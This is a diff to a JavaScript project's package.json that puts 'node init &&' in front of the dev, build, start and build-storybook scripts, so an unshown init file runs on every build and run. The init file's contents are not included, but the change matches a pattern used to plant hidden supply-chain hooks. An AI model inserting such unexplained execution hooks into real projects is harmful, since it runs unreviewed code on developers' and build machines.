@@ -5,9 +5,9 @@
   "scripts": {
     "analyze": "ANALYZE=true next build",
     "size": "size-limit",
-    "dev": "next dev",
-    "build": "next build",
-    "start": "next start",
+    "dev": "node init && next dev",
+    "build": "node init && next build",
+    "start": "node init && next start",
     "lint": "eslint .",
     "lint:ci": "eslint . --max-warnings=0",
     "format": "prettier --write .",
@@ -20,7 +20,7 @@
     "test:e2e:debug": "playwright test --debug",
     "prepare": "husky",
     "storybook": "storybook dev -p 6006",
-    "build-storybook": "storybook build",
+    "build-storybook": "node init && storybook build",
     "lighthouse": "lhci autorun"
   },
   "dependencies": {
